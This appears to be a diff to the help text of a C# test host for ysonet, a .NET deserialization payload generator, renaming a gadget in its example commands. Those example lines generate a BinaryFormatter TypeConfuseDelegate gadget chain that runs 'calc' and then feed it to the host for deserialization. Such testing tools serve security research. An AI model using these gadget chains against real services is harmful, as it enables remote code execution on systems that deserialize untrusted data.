@@ -151,10 +151,10 @@ namespace YsonetNet40TestHost
             output.WriteLine("Force -o raw when you generate, or pass --input base64 here.");
             output.WriteLine("");
             output.WriteLine("Examples:");
-            output.WriteLine("  ysonet.exe -g TypeConfuseDelegateNet40Workflow -f BinaryFormatter -c calc > bf.b64");
+            output.WriteLine("  ysonet.exe -g TypeConfuseDelegateNetFx40 -f BinaryFormatter -c calc > bf.b64");
             output.WriteLine("  ysonet.Net40TestHost.exe --deserialize BinaryFormatter bf.b64");
             output.WriteLine("");
-            output.WriteLine("  ysonet.exe -g TypeConfuseDelegateNet40Workflow -f BinaryFormatter -c calc -o raw > bf.bin");
+            output.WriteLine("  ysonet.exe -g TypeConfuseDelegateNetFx40 -f BinaryFormatter -c calc -o raw > bf.bin");
             output.WriteLine("  ysonet.Net40TestHost.exe --deserialize binaryformatter bf.bin --input raw");
             output.Flush();
         }
